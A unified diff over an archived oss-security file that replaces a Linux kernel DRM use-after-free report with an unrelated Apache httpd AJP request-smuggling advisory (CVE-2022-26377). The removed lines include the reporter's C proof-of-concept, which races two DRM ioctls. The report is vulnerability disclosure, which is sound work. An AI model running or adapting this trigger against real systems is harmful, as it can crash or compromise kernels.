@@ -1,86 +1,23 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/04/13/1
-Message-ID: <YlZy0dacHoITqtOt@eldamar.lan>
-Date: Wed, 13 Apr 2022 08:50:57 +0200
-From: Salvatore Bonaccorso <carnil@...ian.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/06/08/2
+Message-ID: <e9dfb469-1e96-4f36-bc87-990a8db23b0c@apache.org>
+Date: Wed, 08 Jun 2022 09:42:22 +0000
+From: Stefan Eissing <icing@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: Linux kernel: A concurrency use-after-free between drm_setmaster_ioctl and drm_mode_getresources
+Subject: CVE-2022-26377: Apache HTTP Server: mod_proxy_ajp: Possible request smuggling 
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Severity: moderate
 
-On Tue, Apr 12, 2022 at 07:42:04PM +0800, Minh Yuan wrote:
-> Hi guys,
-> 
-> We recently discovered a concurrency uaf in drm of the latest kernel
-> version (Linux 4.19.237).
-> 
-> The root cause of this race is that drm_setmaster_ioctl can free an old
-> *fpriv->master* in drm_new_set_master, while drm_mode_getresources holds a
-> freed *fpriv->master *in drm_lease_held due to the absence of proper
-> lock/refcounting.
-> 
-> My unstable PoC is shown below (tested on Linux 4.19.237):
-> 
-> #include <endian.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/syscall.h>
-> #include <sys/types.h>
-> #include <unistd.h>
-> #include <errno.h>
-> #include <fcntl.h>
-> #include <sys/stat.h>
-> #include <sys/mman.h>
-> #include <pthread.h>
-> #include <sys/xattr.h>
-> #include <sys/shm.h>
-> #include <linux/userfaultfd.h>
-> #include <sys/ioctl.h>
-> #include <drm/drm.h>
-> #include <drm/drm_mode.h>
-> 
-> #define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
-> } while (0)
-> int fd;
-> char a[0x100];
-> void *thread1(void *arg)
-> {
-> 
-> ioctl(fd, DRM_IOCTL_SET_MASTER, 0);
-> 
-> }
-> void *thread2(void *arg)
-> {
-> ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &a);
-> }
-> int main(void)
-> {
-> pthread_t thr1,thr2;
-> 
-> int fd1 = open("/dev/dri/card0",0);
-> fd = open("/dev/dri/card0",0);
-> int fd2 = dup3(fd,fd1,0);
-> int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
-> if(s != 0)
-> errExit("pthread_create");
-> s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
-> if(s != 0)
-> errExit("pthread_create");
-> pthread_join(thr1,NULL);
-> pthread_join(thr2,NULL);
-> close(fd);
-> }
-> 
-> Timeline:
-> * 03.30.22 - Vulnerability reported to security@...nel.org.
-> * 04.01.22 - Vulnerability reported to linux-distros@...openwall.org
-> <security@...nel.org>.
-> * 04.12.22 - Vulnerability opened.
+Description:
 
-This should have CVE-2022-1280 assigned.
+Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling') vulnerability in mod_proxy_ajp of Apache HTTP Server allows an attacker to smuggle requests to the AJP server it forwards requests to.  This issue affects Apache HTTP Server Apache HTTP Server 2.4 version 2.4.53 and prior versions.
 
-Regards,
-Salvatore
+Credit:
+
+Ricter Z @ 360 Noah Lab
+
+References:
+
+https://httpd.apache.org/security/vulnerabilities_24.html
+
